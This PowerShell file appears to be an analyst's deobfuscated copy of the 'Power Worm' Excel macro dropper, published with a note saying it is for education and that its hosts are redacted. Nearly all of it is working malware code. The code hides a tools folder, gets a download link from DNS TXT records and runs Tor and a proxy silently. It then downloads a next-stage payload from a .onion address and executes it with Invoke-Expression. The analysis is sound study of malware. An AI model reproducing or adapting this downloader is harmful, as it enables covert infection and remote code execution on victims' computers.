<#
TERMS OF USE: Considering I am not the original author of this malware, I
cannot apply any formal license to this work. I can, however, apply a
gentleman's clause to the use of this script which is dictated as follows:

DBAD Clause v0.1
----------------
Don't be a douche. This malware has little to no legitimate use and as such, I
reserve the right to publicly shame you if you are caught using this for
malicious purposes. The sole purpose of publishing this malware is to inform
and educate.

Lastly, I have redacted portions of the malware where necessary. Redactions
will be evident in the code.
#>

<#
STEP #1
This is the fully deobfuscated and cleaned up version of the XLS Power Worm macro payload.

The purpose of this payload is to merely to download and execute the stage 1 payload.

This payload performs the following actions:
1) Checks to see if Power Worm is already persistent in the registry
2) Downloads tor.exe and polipo.exe to "$Env:APPDATA\$((Get-WmiObject Win32_ComputerSystemProduct).UUID)"
3) Configures and executes tor.exe and polipo.exe
4) Downloads and executes the next stage payload over tor from "http://REDACTEDREDACTED.onion/get.php?s=setup&mom=REDACTEDREDACTED&uid=$((Get-WmiObject Win32_ComputerSystemProduct).UUID)"
#>

# Ignore all errors
$ErrorActionPreference = 'SilentlyContinue'

# The machine GUID is used throughout Power Worm
$MachineGuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID

# If the payload is already persisted in the registry, kill 
if ((Get-ItemProperty HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $MachineGuid)
{
    Get-Process -Id $PID | Stop-Process
}

# This function retrieves a URI from a DNS TXT record, downloads a zip file, and extracts it
function Get-DnsTXTRecord($DnsHost)
{
    $ZipFileUri = (((Invoke-Expression "nslookup -querytype=txt $DnsHost 8.8.8.8") -match '"') -replace '"', '')[0].Trim()
    $WebClient.DownloadFile($ZipFileUri, $ZipPath)
    $Destination = $Shell.NameSpace($ZipPath).Items();
    # Decompress files
    $Shell.NameSpace($ToolsPath).CopyHere($Destination, 20)
    Remove-Item $ZipPath
}

$ToolsPath = Join-Path $Env:APPDATA $MachineGuid

# Mark the path where tools are extracted as 'Hidden', 'System', 'NotContentIndexed'
if (!(Test-Path $ToolsPath))
{
    $Directory = New-Item -ItemType Directory -Force -Path $ToolsPath
    $Directory.Attributes = 'Hidden', 'System', 'NotContentIndexed'
}

$Tor = Join-Path $ToolsPath 'tor.exe'
$Polipo = Join-Path $ToolsPath 'polipo.exe'
$ZipPath = Join-Path $ToolsPath ($MachineGuid + '.zip')
$WebClient = New-Object Net.WebClient
$Shell = New-Object -ComObject Shell.Application

if (!(Test-Path $Tor) -or !(Test-Path $Polipo))
{
    Get-DnsTXTRecord 'REDACTEDREDACTED.de'
}

if (!(Test-Path $Tor) -or !(Test-Path $Polipo))
{
    Get-DnsTXTRecord 'REDACTEDREDACTED.cc'
}

$TorRoamingLog = Join-Path $ToolsPath 'roaminglog'
# Start Tor and maintain an initialization log file
Start-Process $Tor -ArgumentList " --Log `"notice file $TorRoamingLog`"" -WindowStyle Hidden

# Wait for Tor to finish initializing
do
{
    Start-Sleep 1
    $LogContents = Get-Content $TorRoamingLog
}
while (!($LogContents -match 'Bootstrapped 100%: Done.'))

# Start polipo proxy
Start-Process $Polipo -ArgumentList 'socksParentProxy=localhost:9050' -WindowStyle Hidden
Start-Sleep 7
$WebProxy = New-Object Net.WebProxy('localhost:8123')
$WebProxy.UseDefaultCredentials = $True
$WebClient.Proxy = $WebProxy

$Stage1Uri = 'http://REDACTEDREDACTED.onion/get.php?s=setup&mom=REDACTEDREDACTED&uid=' + $MachineGuid

while (!$Stage1Payload)
{
    $Stage1Payload=$WebClient.downloadString($Stage1Uri)
}

if ($Stage1Payload -ne 'none')
{
    # Execute the stage 1 payload
    Invoke-Expression $Stage1Payload
    # The downloaded payload is decoded, deobfuscated, cleaned up, and analyzed in PowerWorm_Part2.ps1
}
